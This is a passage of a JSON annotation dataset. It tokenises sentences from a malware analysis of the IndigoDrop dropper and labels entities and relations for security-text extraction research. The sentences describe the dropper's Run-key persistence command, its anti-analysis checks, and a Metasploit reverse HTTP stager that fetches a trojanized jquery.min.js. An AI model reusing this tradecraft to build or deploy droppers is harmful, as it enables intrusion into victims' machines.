[{"type": "MP", "sent_id": 3, "global_pos": [68, 68], "name": "dropper", "pos": [10, 11], "index": "11_0"}], [{"type": "SO", "sent_id": 3, "global_pos": [75, 75], "name": "endpoint", "pos": [17, 18], "index": "12_0"}], [{"type": "MF", "sent_id": 3, "global_pos": [81, 81], "name": "registry Run key", "pos": [23, 26], "index": "13_0"}], [{"type": "MF", "sent_id": 3, "global_pos": [107, 107], "name": "Metasploit shellcode", "pos": [49, 51], "index": "14_0"}], [{"type": "MF", "sent_id": 4, "global_pos": [116, 116], "name": "Username", "pos": [6, 7], "index": "15_0"}], [{"type": "MF", "sent_id": 4, "global_pos": [118, 118], "name": "Computername", "pos": [8, 9], "index": "16_0"}], [{"type": "MF", "sent_id": 4, "global_pos": [120, 120], "name": "parent folder name", "pos": [10, 13], "index": "17_0"}], [{"type": "MF", "sent_id": 4, "global_pos": [124, 124], "name": "MAC addresses", "pos": [14, 16], "index": "18_0"}], [{"type": "MF", "sent_id": 4, "global_pos": [127, 127], "name": "Public IP addresses", "pos": [17, 20], "index": "19_0"}], [{"type": "MP", "sent_id": 5, "global_pos": [144, 144], "name": "IndigoDrop", "pos": [7, 8], "index": "20_0"}], [{"type": "MF", "sent_id": 5, "global_pos": [147, 147], "name": "Blocked values", "pos": [10, 12], "index": "21_0"}], [{"type": "MF", "sent_id": 6, "global_pos": [165, 165], "name": "Metasploit shellcode", "pos": [9, 11], "index": "22_0"}], [{"type": "MP", "sent_id": 6, "global_pos": [170, 170], "name": "reverse HTTP stager", "pos": [14, 17], "index": "23_0"}], [{"type": "MF", "sent_id": 6, "global_pos": [178, 178], "name": "file", "pos": [22, 23], "index": "24_0"}], [{"type": "SO", "sent_id": 6, "global_pos": [183, 183], "name": "location", "pos": [27, 28], "index": "25_0"}], [{"type": "MF", "sent_id": 7, "global_pos": [186, 186], "name": "shellcode", "pos": [1, 2], "index": "26_0"}], [{"type": "SO", "sent_id": 7, "global_pos": [197, 197], "name": "hosting site", "pos": [12, 14], "index": "27_0"}]], "labels": [{"r": "WR", "evidence": [0], "h": 0, "t": 1}, {"r": "ST", "evidence": [0], "h": 0, "t": 2}, {"r": "RF", "evidence": [0], "h": 0, "t": 2}, {"r": "ST", "evidence": [0, 1], "h": 0, "t": 5}, {"r": "RF", "evidence": [0, 1], "h": 0, "t": 5}, {"r": "CO", "evidence": [0, 1], "h": 1, "t": 4}, {"r": "CO", "evidence": [0, 1], "h": 1, "t": 3}, {"r": "CO", "evidence": [0, 1, 2], "h": 1, "t": 6}, {"r": "CO", "evidence": [0, 1, 2, 3], "h": 1, "t": 9}, {"r": "CO", "evidence": [0, 1, 2, 3, 4, 5, 6], "h": 1, "t": 22}, {"r": "CO", "evidence": [0, 1, 2, 3, 4, 5, 6, 7], "h": 1, "t": 26}, {"r": "EX", "evidence": [2], "t": 6, "h": 8}, {"r": "ST", "evidence": [2], "t": 7, "h": 8}, {"r": "RF", "evidence": [2], "t": 7, "h": 8}, {"r": "ST", "evidence": [3], "h": 11, "t": 12}, {"r": "RF", "evidence": [3], "h": 11, "t": 12}, {"r": "WR", "evidence": [3], "h": 11, "t": 13}, {"r": "WR", "evidence": [3], "h": 11, "t": 14}, {"r": "EX", "evidence": [3], "h": 11, "t": 14}, {"r": "WR", "evidence": [3, 4], "h": 11, "t": 15}, {"r": "WR", "evidence": [3, 4], "h": 11, "t": 16}, {"r": "WR", "evidence": [3, 4], "h": 11, "t": 17}, {"r": "WR", "evidence": [3, 4], "h": 11, "t": 18}, {"r": "WR", "evidence": [3, 4], "h": 11, "t": 19}, {"r": "ST", "evidence": [3, 4, 5, 6, 7], "h": 10, "t": 27}, {"r": "RF", "evidence": [3, 4, 5, 6, 7], "h": 10, "t": 27}, {"r": "CO", "evidence": [3, 4, 5], "h": 10, "t": 20}, {"r": "UK", "evidence": [5], "h": 20, "t": 21}, {"r": "WR", "evidence": [4, 5, 6], "t": 15, "h": 23}, {"r": "WR", "evidence": [4, 5, 6], "t": 16, "h": 23}, {"r": "WR", "evidence": [4, 5, 6], "t": 17, "h": 23}, {"r": "WR", "evidence": [4, 5, 6], "t": 18, "h": 23}, {"r": "WR", "evidence": [4, 5, 6], "t": 19, "h": 23}, {"r": "EX", "evidence": [6], "t": 22, "h": 23}, {"r": "WR", "evidence": [6], "h": 23, "t": 24}, {"r": "ST", "evidence": [6], "h": 23, "t": 25}, {"r": "RF", "evidence": [6], "h": 23, "t": 25}]}, {"title": "643-20", "sents": [["The", "Metasploit", "shellcode", "(", "Stage", "2A", ")", "is", "hosted", "in", "the", "form", "of", "a", "Base64", "encoded", "string", "on", "the", "download", "locations", "."], ["This", "shellcode", "is", "base64", "decoded", ",", "unhexlified", "and", "executed", "on", "the", "endpoint", "as", "part", "of", "IndigoDrop", "'", "s", "execution", "."], ["Base64-encoded", "Metasploit", "shellcode", ":", "Base64-decoded", "Metasploit", "shellcode", ":", "IndigoDrop", "analysisThis", "dropper", "performs", "the", "following", "actions", "on", "the", "endpoint", ":", "Establish", "persistence", "using", "the", "registry", "Run", "key", "for", "itself", "in", "location", ":", "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run", "|", "iexplorer", "=", "cmd", "/c", "<", "file_path_of_Dropper", ">", "/onboot", "-hideE.g", ".", "Download", "and", "execute", "the", "Stage", "2A", "Metasploit", "shellcode", "."], ["Anti-Infection", "Checks", ":", "Check", "the", "current", "Username", ",", "Computername", ",", "parent", "folder", "name", ",", "MAC", "addresses", ",", "Public", "IP", "addresses", "against", "a", "list", "of", "blocked", "values", "."], ["If", "any", "of", "the", "values", "match", ",", "IndigoDrop", "quits", "(", "Blocked", "values", "listed", "in", "the", "IOC", "section", ")", "."], ["Stage", "2A", ":", "Metasploit", "(", "MSF", ")", "downloader", "shellcodeThe", "Metasploit", "shellcode", "is", "a", "modified", "reverse", "HTTP", "stager", "meant", "to", "download", "a", "malicious", "file", "from", "the", "specified", "download", "location", "."], ["This", "shellcode", "(", "stage", "2A", ")", "is", "usually", "hosted", "on", "a", "public", "hosting", "site", "such", "as", "pastebin.com", "."], ["The", "malicious", "file", "downloaded", "is", "usually", "a", "copy", "of", "a", "trojanized", "jquery.min.js", "file", "."]], "vertexSet": [[{"type": "MF", "sent_id": 0, "global_pos": [1, 1], "name": "Metasploit shellcode", "pos": [1, 3], "index": "0_0"}], [{"type": "MF", "sent_id": 0, "global_pos": [14, 14], "name": "Base64 encoded string", "pos": [14, 17], "index": "1_0"}], [{"type": "SO", "sent_id": 0, "global_pos": [20, 20], "name": "locations", "pos": [20, 21], "index": "2_0"}], [{"type": "MF", "sent_id": 1, "global_pos": [23, 23], "name": "shellcode", "pos": [1, 2], "index": "3_0"}], [{"type": "SO", "sent_id": 1, "global_pos": [33, 33], "name": "endpoint", "pos": [11, 12], "index": "4_0"}], [{"type": "MP", "sent_id": 1, "global_pos": [37, 37], "name": "IndigoDrop '", "pos": [15, 17], "index": "5_0"}], [{"type": "MF", "sent_id": 2, "global_pos": [47, 47], "name": "Metasploit shellcode", "pos": [5, 7], "index": "6_0"}], [{"type": "MP", "sent_id": 2, "global_pos": [50, 50], "name": "IndigoDrop", "pos": [8, 9], "index": "7_0"}], [{"type": "MP", "sent_id": 2, "global_pos": [52, 52], "name": "dropper", "pos": [10, 11], "index": "8_0"}], [{"type": "SO", "sent_id": 2, "global_pos": [59, 59], "name": "endpoint", "pos": [17, 18], "index": "9_0"}], [{"type": "MF", "sent_id": 2, "global_pos": [65, 65], "name": "registry Run key", "pos": [23, 26], "index": "10_0"}], [{"type": "MF", "sent_id": 2, "global_pos": [91, 91], "name": "Metasploit shellcode", "pos": [49, 51], "index": "11_0"}], [{"type": "MF", "sent_id": 3, "global_pos": [100, 100], "name": "Username", "pos": [6, 7], "index": "12_0"}], [{"type": "MF", "sent_id": 3, "global_pos": [102, 102], "name": "Computername", "pos": [8, 9], "index": "13_0"}], [{"type": "MF", "sent_id": 3, "global_pos": [104, 104], "name": "parent folder name", "pos": [10, 13], "index": "14_0"}], [{"type": "MF", "sent_id": 3, "global_pos": [108, 108], "name": "MAC addresses", "pos": [14, 16], "index": "15_0"}], [{"type": "MF", "sent_id": 3, "global_pos": [111, 111], "name": "Public IP addresses", "pos": [17, 20], "index": "16_0"}], [{"type": "MP", "sent_id": 4, "global_pos": [128, 128], "name": "IndigoDrop", "pos": [7, 8], "index": "17_0"}], [{"type": "MF", "sent_id": 4, "global_pos": [131, 131], "name": "Blocked values", "pos": [10, 12], "index": "18_0"}], [{"type": "MF", "sent_id": 5, "global_pos": [149, 149], "name": "Metasploit shellcode", "pos": [9, 11], "index": "19_0"}], [{"type": "MP", "sent_id": 5, "global_pos": [154, 154], "name": "reverse HTTP stager", "pos": [14, 17], "index": "20_0"}], [{"type": "MF", "sent_id": 5, "global_pos": [162, 162], "name": "file", "pos": [22, 23], "index": "21_0"}], [{"type": "SO", "sent_id": 5, "global_pos": [167, 167], "name": "location", "pos": [27, 28], "index": "22_0"}], [{"type": "MF", "sent_id": 6, "global_pos": [170, 170], "name": "shellcode", "pos": [1, 2], "index": "23_0"}], [{"type": "SO", "sent_id": 6, "global_pos": [181, 181], "name": "hosting site", "pos": [12, 14], "index": "24_0"}], [{"type": "MF", "sent_id": 7, "global_pos": [189, 189], "name": "file", "pos": [2, 3], "index": "25_0"}], [{"type": "MF", "sent_id": 7, "global_pos": [197, 197], "name": "trojanized jquery.min.js file", "pos": [10, 13], "index": "26_0"}]], "labels": [{"r": "EX", "evidence": [1], "t": 3, "h": 5}, {"r": "ST", "evidence": [1], "t": 4, "h": 5}, {"r": "RF", "evidence": [1], "t": 4, "h": 5}, {"r": "ST", "evidence": [2], "h": 8, "t": 9}, {"r": "RF", "evidence": [2], "h": 8, "t": 9}, {"r": "WR", "evidence": [2], "h": 8, "t": 10}, {"r": "WR", "evidence": [2], "h": 8, "t": 11}, {"r": "EX", "evidence": [2], "h": 8, "t": 11}, {"r": "WR", "evidence": [2, 3], "h": 8, "t": 12}, {"r": "WR", "evidence": [2, 3], "h": 8, "t": 13}, {"r": "WR", "evidence": [2, 3], "h": 8, "t": 14}, {"r": "WR", "evidence": [2, 3], "h": 8, "t": 15}, {"r": "WR", "evidence": [2, 3], "h": 8, "t": 16}, {"r": "ST", "evidence": [2, 3, 4, 5, 6], "h": 7, "t": 24}, {"r": "RF", "evidence": [2, 3, 4, 5, 6], "h": 7, "t": 24}, {"r": "CO", "evidence": [2, 3, 4], "h": 7, "t": 17}, {"r": "UK", "evidence": [4], "h": 17, "t": 18}, {"r": "WR", "evidence": [3, 4, 5], "t": 12, "h": 20}, {"r": "WR", "evidence": [3, 4, 5], "t": 13, "h": 20}, {"r": "WR", "evidence": [3, 4, 5], "t": 14, "h": 20}, {"r": "WR", "evidence": [3, 4, 5], "t": 15, "h": 20}, {"r": "WR", "evidence": [3, 4, 5], "t": 16, "h": 20}, {"r": "EX", "evidence": [5], "t": 19, "h": 20}, {"r": "WR", "evidence": [5], "h": 20, "t": 21}, {"r": "ST", "evidence": [5], "h": 20, "t": 22}, {"r": "RF", "evidence": [5], "h": 20, "t": 22}, {"r": "CO", "evidence": [7], "h": 25, "t": 26}]}, {"title": "643-21", "sents": [["This", "shellcode", "is", "base64", "decoded", ",", "unhexlified", "and", "executed", "on", "the", "endpoint", "as", "part", "of", "IndigoDrop", "'", "s", "execution", "."], ["Base64-encoded", "Metasploit", "shellcode", ":", "Base64-decoded", "Metasploit", "shellcode", ":", "IndigoDrop", "analysisThis", "dropper", "performs", "the", "following", "actions", "on", "the", "endpoint", ":", "Establish", "persistence", "using", "the", "registry", "Run", "key", "for", "itself", "in", "location", ":", "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run", "|", "iexplorer", "=", "cmd", "/c", "<", "file_path_of_Dropper", ">", "/onboot", "-hideE.g", ".", "Download", "and", "execute", "the", "Stage", "2A", "Metasploit", "shellcode", "."], ["Anti-Infection", "Checks", ":", "Check", "the", "current", "Username", ",", "Computername", ",", "parent", "folder", "name", ",", "MAC", "addresses", ",", "Public", "IP", "addresses", "against", "a", "list", "of", "blocked", "values", "."], ["If", "any", "of", "the", "values", "match", ",", "IndigoDrop", "quits", "(", "Blocked", "values", "listed", "in", "the", "IOC", "section", ")", "."], ["Stage", "2A", ":", "Metasploit", "(", "MSF", ")", "downloader", "shellcodeThe", "Metasploit", "shellcode", "is", "a", "modified", "reverse", "HTTP", "stager", "meant", "to", "download", "a", "malicious", "file", "from", "the", "specified", "download", "location", "."], ["This", "shellcode", "(", "stage", "2A", ")", "is", "usually", "hosted", "on", "a", "public", "hosting", "site", "such", "as", "pastebin.com", "."], ["The", "malicious", "file", "downloaded", "is", "usually", "a", "copy", "of", "a", "trojanized", "jquery.min.js", "file", "."], ["The", "malicious", "jQuery", "file", "consists", "of", ":", "Legitimate", "JavaScript", "(", "JS", ")", "code", "at", "the", "top", "and", "end", "of", "the", "file", "."]], "vertexSet": [[{"type": "MF", "sent_id": 0, "global_pos": [1, 1], "name": "shellcode", "pos": [1, 2], "index": "0_0"}], [{"type": "SO", "sent_id": 0, "global_pos": [11, 11], "name": "endpoint", "pos": [11, 12], "index": "1_0"}], [{"type": "MP", "sent_id": 0, "global_pos": [15, 15], "name": "IndigoDrop '", "pos": [15, 17], "index": "2_0"}], [{"type": "MF", "sent_id": 1, "global_pos": [25, 25], "name": "Metasploit shellcode", "pos": [5, 7], "index": "3_0"}], [{"type": "MP", "sent_id": 1, "global_pos": [28, 28], "name": "IndigoDrop", "pos": [8, 9], "index": "4_0"}], [{"type": "MP", "sent_id": 1, "global_pos": [30, 30], "name": "dropper", "pos": [10, 11], "index": "5_0"}], [{"type": "SO", "sent_id": 1, "global_pos": [37, 37], "name": "endpoint", "pos": [17, 18], "index": "6_0"}], [{"type": "MF", "sent_id": 1, "global_pos": [43, 43], "name": "registry Run key", "pos": [23, 26], "index": "7_0"}], [{"type": "MF", "sent_id": 1, "global_pos": [69, 69], "name": "Metasploit shellcode", "pos": [49, 51], "index": "8_0"}], [{"type": "MF", "sent_id": 2, "global_pos": [78, 78], "name": "Username", "pos": [6, 7], "index": "9_0"}], [{"type": "MF", "sent_id": 2, "global_pos": [80, 80], "name": "Computername", "pos": [8, 9], "index": "10_0"}], [{"type": "MF", "sent_id": 2, "global_pos": [82, 82], "name": "parent folder name", "pos": [10, 13], "index": "11_0"}], [{"type": "MF", "sent_id": 2, "global_pos": [86, 86], "name": "MAC addresses", "pos": [14, 16], "index": "12_0"}], [{"type": "MF", "sent_id": 2, "global_pos": [89, 89], "name": "Public IP addresses", "pos": [17, 20], "index": "13_0"}], [{"type": "MP", "sent_id": 3, "global_pos": [106, 106], "name": "IndigoDrop", "pos": [7, 8], "index": "14_0"}], [{"type": "MF", "sent_id": 3, "global_pos": [109, 109], "name": "Blocked values", "pos": [10, 12], "index": "15_0"}], [{"type": "MF", "sent_id": 4, "global_pos": [127, 127], "name": "Metasploit shellcode", "pos": [9, 11], "index": "16_0"}], [{"type": "MP", "sent_id": 4, "global_pos": [132, 132], "name": "reverse HTTP stager", "pos": [14, 17], "index": "17_0"}], [{"type": "MF", "sent_id": 4, "global_pos": [140, 140], "name": "file", "pos": [22, 23], "index": "18_0"}], [{"type": "SO", "sent_id": 4, "global_pos": [145, 145], "name": "location", "pos": [27, 28], "index": "19_0"}], [{"type": "MF", "sent_id": 5, "global_pos": [148, 148], "name": "shellcode", "pos": [1, 2], "index": "20_0"}], [{"type": "SO", "sent_id": 5, "global_pos": [159, 159], "name": "hosting site", "pos": [12, 14], "index": "21_0"}], [{"type": "MF", "sent_id": 6, "global_pos": [167, 167], "name": "file", "pos": [2, 3], "index": "22_0"}], [{"type": "MF", "sent_id": 6, "global_pos": [175, 175], "name": "trojanized jquery.min.js file", "pos": [10, 13], "index": "23_0"}], [{"type": "MF", "sent_id": 7, "global_pos": [181, 181], "name": "jQuery file", "pos": [2, 4], "index": "24_0"}], [{"type": "MF", "sent_id": 7, "global_pos": [187, 187], "name": "JavaScript", "pos": [8, 9], "index": "25_0"}]], "labels": [{"r": "EX", "evidence": [0], "t": 0, "h": 2}, {"r": "ST", "evidence": [0], "t": 1, "h": 2}, {"r": "RF", "evidence": [0], "t": 1, "h": 2}, {"r": "ST", "evidence": [1], "h": 5, "t": 6}, {"r": "RF", "evidence": [1], "h": 5, "t": 6}, {"r": "WR", "evidence": [1], "h": 5, "t": 7}, {"r": "WR", "evidence": [1], "h": 5, "t": 8}, {"r": "EX", "evidence": [1], "h": 5, "t": 8}, {"r": "WR", "evidence": [1, 2], "h": 5, "t": 9}, {"r": "WR", "evidence": [1, 2], "h": 5, "t": 10}, {"r": "WR", "evidence": [1, 2], "h": 5, "t": 11}, {"r": "WR", "evidence": [1, 2], "h": 5, "t": 12}, {"r": "WR", "evidence": [1, 2], "h": 5, "t": 13}, {"r": "ST", "evidence": [1, 2, 3, 4, 5], "h": 4, "t": 21}, {"r": "RF", "evidence": [1, 2, 3, 4, 5], "h": 4, "t": 21}, {"r": "CO", "evidence": [1, 2, 3], "h": 4, "t": 14}, {"r": "UK", "evidence": [3], "h": 14, "t": 15}, {"r": "WR", "evidence": [2, 3, 4], "t": 9, "h": 17}, {"r": "WR", "evidence": [2, 3, 4], "t": 10, "h": 17}, {"r": "WR", "evidence": [2, 3, 4], "t": 11, "h": 17}, {"r": "WR", "evidence": [2, 3, 4], "t": 12, "h": 17}, {"r": "WR", "evidence": [2, 3, 4], "t": 13, "h": 17}, {"r": "EX", "evidence": [4], "t": 16, "h": 17}, {"r": "WR", "evidence": [4], "h": 17, "t": 18}, {"r": "ST", "evidence": [4], "h": 17, "t": 19}, {"r": "RF", "evidence": [4], "h": 17, "t": 19}, {"r": "CO", "evidence": [6], "h": 22, "t": 23}, {"r": "CO", "evidence": [7], "h": 24, "t": 25}]}, {"title": "643-22", "sents": [["Base64-encoded", "Metasploit", "shellcode", ":", "Base64-decoded", "Metasploit", "shellcode", ":", "IndigoDrop", "analysisThis", "dropper", "performs", "the", "following", "actions", "on", "the", "endpoint", ":", "Establish", "persistence", "using", "the", "registry", "Run", "key", "for", "itself", "in", "location", ":", "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run", "|", "iexplorer", "=", "cmd", "/c", "<", "file_path_of_Dropper", ">", "/onboot", "-hideE.g", ".", "Download", "and", "execute", "the", "Stage", "2A", "Metasploit", "shellcode", "."], ["Anti-Infection", "Checks", ":", "Check", "the", "current", "Username", ",", "Computername", ",", "parent", "folder", "name", ",", "MAC", "addresses", ",", "Public", "IP", "addresses", "against", "a", "list", "of", "blocked", "values", "."], ["If", "any", "of", "the", "values", "match", ",", "IndigoDrop", "quits", "(", "Blocked", "values", "listed", "in", "the", "IOC", "section", ")", "."], ["Stage", "2A", ":", "Metasploit", "(", "MSF", ")", "downloader", "shellcodeThe", "Metasploit", "shellcode", "is", "a", "modified", "reverse", "HTTP", "stager", "meant", "to", "download", "a", "malicious", "file", "from", "the", "specified", "download", "location", "."], ["This", "shellcode", "(", "stage", "2A", ")", "is", "usually", "hosted", "on", "a", "public", "hosting", "site", "such", "as", "pastebin.com", "."], ["The", "malicious", "file", "downloaded", "is", "usually", "a", "copy", "of", "a", "trojanized", "jquery.min.js", "file", "."], ["The", "malicious", "jQuery", "file", "consists", "of", ":", "Legitimate", "JavaScript", "(", "JS", ")", "code", "at", "the", "top", "and", "end", "of", "the", "file", "."], ["At", "a", "specific", "offset", "in", "the", "file", "is", "yet", "another", "shellcode", "(", "referred", "to", "as", "Stage", "3A", ")", "."]], "vertexSet": [[{"type": "MF", "sent_id": 0, "global_pos": [5, 5], "name": "Metasploit shellcode", "pos": [5, 7], "index": "0_0"}], [{"type": "MP", "sent_id": 0, "global_pos": [8, 8], "name": "IndigoDrop", "pos": [8, 9], "index": "1_0"}], [{"type": "MP", "sent_id": 0, "global_pos": [10, 10], "name": "dropper", "pos": [10, 11], "index": "2_0"}], [{"type": "SO", "sent_id": 0, "global_pos": [17, 17], "name": "endpoint", "pos": [17, 18], "index": "3_0"}], [{"type": "MF", "sent_id": 0, "global_pos": [23, 23], "name": "registry Run key", "pos": [23, 26], "index": "4_0"}], [{"type": "MF", "sent_id": 0, "global_pos": [49, 49], "name": "Metasploit shellcode", "pos": [49, 51], "index": "5_0"}], [{"type": "MF", "sent_id": 1, "global_pos": [58, 58], "name": "Username", "pos": [6, 7], "index": "6_0"}], [{"type": "MF", "sent_id": 1, "global_pos": [60, 60], "name": "Computername", "pos": [8, 9], "index": "7_0"}], [{"type": "MF", "sent_id": 1, "global_pos": [62, 62], "name": "parent folder name", "pos": [10, 13], "index": "8_0"}], [{"type": "MF", "sent_id": 1, "global_pos": [66, 66], "name": "MAC addresses", "pos": [14, 16], "index": "9_0"}], [{"type": "MF", "sent_id": 1, "global_pos": [69, 69], "name": "Public IP addresses", "pos": [17, 20], "index": "10_0"}], [{"type": "MP", "sent_id": 2, "global_pos": [86, 86], "name": "IndigoDrop", "pos": [7, 8], "index": "11_0"}], [{"type": "MF", "sent_id": 2, "global_pos": [89, 89], "name": "Blocked values", "pos": [10, 12], "index": "12_0"}], [{"type": "MF", "sent_id": 3, "global_pos": [107, 107], "name": "Metasploit shellcode", "pos": [9, 11], "index": "13_0"}], [{"type": "MP", "sent_id": 3, "global_pos": [112, 112], "name": "reverse HTTP stager", "pos": [14, 17], "index": "14_0"}], [{"type": "MF", "sent_id": 3, "global_pos": [120, 120], "name": "file", "pos": [22, 23], "index": "15_0"}], [{"type": "SO", "sent_id": 3, "global_pos": [125, 125], "name": "location", "pos": [27, 28], "index": "16_0"}], [{"type": "MF", "sent_id": 4, "global_pos": [128, 128], "name": "shellcode", "pos": [1, 2], "index": "17_0"}], [{"type": "SO", "sent_id": 4, "global_pos": [139, 139], "name": "hosting site", "pos": [12, 14], "index": "18_0"}], [{"type": "MF", "sent_id": 5, "global_pos": [147, 147], "name": "file", "pos": [2, 3], "index": "19_0"}], [{"type": "MF", "sent_id": 5, "global_pos": [155, 155], "name": "trojanized jquery.min.js file", "pos": [10, 13], "index": "20_0"}], [{"type": "MF", "sent_id": 6, "global_pos": [161, 161], "name": "jQuery file", "pos": [2, 4], "index": "21_0"}], [{"type": "MF", "sent_id": 6, "global_pos": [167, 167], "name": "JavaScript", "pos": [8, 9], "index": "22_0"}], [{"type": "MF", "sent_id": 7, "global_pos": [187, 187], "name": "file", "pos": [6, 7], "index": "23_0"}], [{"type": "MF", "sent_id": 7, "global_pos": [191, 191], "name": "shellcode", "pos": [10, 11], "index": "24_0"}]], "labels": [{"r": "ST", "evidence": [0], "h": 2, "t": 3}, {"r": "RF", "evidence": [0], "h": 2, "t": 3}, {"r": "WR", "evidence": [0], "h": 2, "t": 4}, {"r": "WR", "evidence": [0], "h": 2, "t": 5}, {"r": "EX", "evidence": [0], "h": 2, "t": 5}, {"r": "WR", "evidence": [0, 1], "h": 2, "t": 6}, {"r": "WR", "evidence": [0, 1], "h": 2, "t": 7}, {"r": "WR", "evidence": [0, 1], "h": 2, "t": 8}, {"r": "WR", "evidence": [0, 1], "h": 2, "t": 9}, {"r": "WR", "evidence": [0, 1], "h": 2, "t": 10}, {"r": "ST", "evidence": [0, 1, 2, 3, 4], "h": 1, "t": 18}, {"r": "RF", "evidence": [0, 1, 2, 3, 4], "h": 1, "t": 18}, {"r": "CO", "evidence": [0, 1, 2], "h": 1, "t": 11}, {"r": "UK", "evidence": [2], "h": 11, "t": 12}, {"r": "WR", "evidence": [1, 2, 3], "t": 6, "h": 14}, {"r": "WR", "evidence": [1, 2, 3], "t": 7, "h": 14}, {"r": "WR", "evidence": [1, 2, 3], "t": 8, "h": 14}, {"r": "WR", "evidence": [1, 2, 3], "t": 9, "h": 14}, {"r": "WR", "evidence": [1, 2, 3], "t": 10, "h": 14}, {"r": "EX", "evidence": [3], "t": 13, "h": 14}, {"r": "WR", "evidence": [3], "h": 14, "t": 15}, {"r": "ST", "evidence": [3], "h": 14, "t": 16}, {"r": "RF", "evidence": [3], "h": 14, "t": 16}, {"r": "CO", "evidence": [5], "h": 19, "t": 20}, {"r": "CO", "evidence": [6], "h": 21, "t": 22}, {"r": "CO", "evidence": [6, 7], "h": 21, "t": 23}, {"r": "CO", "evidence": [6, 7], "h": 21, "t": 24}]}, {"title": "643-23", "sents": [["Anti-Infection", "Checks", ":", "Check", "the", "current", "Username", ",", "Computername", ",", "parent", "folder", "name", ",", "MAC", "addresses", ",", "Public", "IP", "addresses", "against", "a", "list", "of", "blocked", "values", "."], ["If", "any", "of", "the", "values", "match", ",", "IndigoDrop", "quits", "(", "Blocked", "values", "listed", "in", "the", "IOC", "section", ")", "."], ["Stage", "2A", ":", "Metasploit", "(", "MSF", ")", "downloader", "shellcodeThe", "Metasploit", "shellcode", "is", "a", "modified", "reverse", "HTTP", "stager", "meant", "to", "download", "a", "malicious", "file", "from", "the", "specified", "download", "location", "."], ["This", "shellcode", "(", "stage", "2A", ")", "is", "usually", "hosted", "on", "a", "public", "hosting", "site", "such", "as", "pastebin.com", "."], ["The", "malicious", "file", "downloaded", "is", "usually", "a", "copy", "of", "a", "trojanized", "jquery.min.js", "file", "."], ["The", "malicious", "jQuery", "file", "consists", "of", ":", "Legitimate", "JavaScript", "(", "JS", ")", "code", "at", "the", "top", "and", "end", "of", "the", "file", "."], ["At", "a", "specific", "offset", "in", "the", "file", "is", "yet", "another", "shellcode", "(", "referred", "to", "as", "Stage", "3A", ")", "."], ["The", "Metasploit", "HTTP", "stager", "carries", "out", "the", "following", "actions", "in", "sequence", ":", "Connect", "to", "the", "malicious", "attacker-controlled", "IP", "address", "."]], "vertexSet": [[{"type": "MF", "sent_id": 0, "global_pos": [6, 6], "name": "Username", "pos": [6, 7], "index": "0_0"}], [{"type": "MF", "sent_id": 0, "global_pos": [8, 8], "name": "Computername", "pos": [8, 9], "index": "1_0"}], [{"type": "MF", "sent_id": 0, "global_pos": [10, 10], "name": "parent folder name", "pos": [10, 13], "index": "2_0"}], [{"type": "MF", "sent_id": 0, "global_pos": [14, 14], "name": "MAC addresses", "pos": [14, 16], "index": "3_0"}], [{"type": "MF", "sent_id": 0, "global_pos": [17, 17], "name": "Public IP addresses", "pos": [17, 20], "index": "4_0"}], [{"type": "MP", "sent_id": 1, "global_pos": [34, 34], "name": "IndigoDrop", "pos": [7, 8], "index": "5_0"}], [{"type": "MF", "sent_id": 1, "global_pos": [37, 37], "name": "Blocked values", "pos": [10, 12], "index": "6_0"}], [{"type": "MF", "sent_id": 2, "global_pos": [55, 55], "name": "Metasploit shellcode", "pos": [9, 11], "index": "7_0"}], [{"type": "MP", "sent_id": 2, "global_pos": [60, 60], "name": "reverse HTTP stager", "pos": [14, 17], "index": "8_0"}], [{"type": "MF", "sent_id": 2, "global_pos": [68, 68], "name": "file", "pos": [22, 23], "index": "9_0"}], [{"type": "SO", "sent_id": 2, "global_pos": [73, 73], "name": "location", "pos": [27, 28], "index": "10_0"}], [{"type": "MF", "sent_id": 3, "global_pos": [76, 76], "name": "shellcode", "pos": [1, 2], "index": "11_0"}], [{"type": "SO", "sent_id": 3, "global_pos": [87, 87], "name": "hosting site", "pos": [12, 14], "index": "12_0"}], [{"type": "MF", "sent_id": 4, "global_pos": [95, 95], "name": "file", "pos": [2, 3], "index": "13_0"}], [{"type": "MF", "sent_id": 4, "global_pos": [103, 103], "name": "trojanized jquery.min.js file", "pos": [10, 13], "index": "14_0"}], [{"type": "MF", "sent_id": 5, "global_pos": [109, 109], "name": "jQuery file", "pos": [2, 4], "index": "15_0"}], [{"type": "MF", "sent_id": 5, "global_pos": [115, 115], "name": "JavaScript", "pos": [8, 9], "index": "16_0"}], [{"type": "MF", "sent_id": 6, "global_pos": [135, 135], "name": "file", "pos": [6, 7], "index": "17_0"}], [{"type": "MF", "sent_id": 6, "global_pos": [139, 139], "name": "shellcode", "pos": [10, 11], "index": "18_0"}], [{"type": "MP", "sent_id": 7, "global_pos": [149, 149], "name": "Metasploit HTTP stager", "pos": [1, 4], "index": "19_0"}], [{"type": "SO", "sent_id": 7, "global_pos": [165, 165], "name": "IP address", "pos": [17, 19], "index": "20_0"}]], "labels": [{"r": "UK", "evidence": [1], "h": 5, "t": 6}, {"r": "WR", "evidence": [0, 1, 2], "t": 0, "h": 8}, {"r": "WR", "evidence": [0, 1, 2], "t": 1, "h": 8}, {"r": "WR", "evidence": [0, 1, 2], "t": 2, "h": 8}, {"r": "WR", "evidence": [0, 1, 2], "t": 3, "h": 8}, {"r": "WR", "evidence": [0, 1, 2], "t": 4, "h": 8}, {"r": "EX", "evidence": [2], "t": 7, "h": 8}, {"r": "WR", "evidence": [2], "h": 8, "t": 9}, {"r": "ST", "evidence": [2], "h": 8, "t": 10}, {"r": "RF", "evidence": [2], "h": 8, "t": 10}, {"r": "CO", "evidence": [4], "h": 13, "t": 14}, {"r": "CO", "evidence": [5], "h": 15, "t": 16}, {"r": "CO", "evidence": [5, 6], "h": 15, "t": 17}, {"r": "CO", "evidence": [5, 6], "h": 15, "t": 18}, {"r": "ST", "evidence": [3, 4, 5, 6, 7], "t": 12, "h": 19}, {"r": "RF", "evidence": [3, 4, 5, 6, 7], "t": 12, "h": 19}, {"r": "ST", "evidence": [7], "h": 19, "t": 20}, {"r": "RF", "evidence": [7], "h": 19, "t": 20}]}, {"title": "643-24", "sents": [["If", "any", "of", "the", "values", "match", ",", "IndigoDrop", "quits", "(", "Blocked", "values", "listed", "in", "the", "IOC", "section", ")", "."], ["Stage", "2A", ":", "Metasploit", "(", "MSF", ")", "downloader", "shellcodeThe", "Metasploit", "shellcode", "is", "a", "modified", "reverse", "HTTP", "stager", "meant", "to", "download", "a", "malicious", "file", "from", "the", "specified", "download", "location", "."], ["This", "shellcode", "(", "stage", 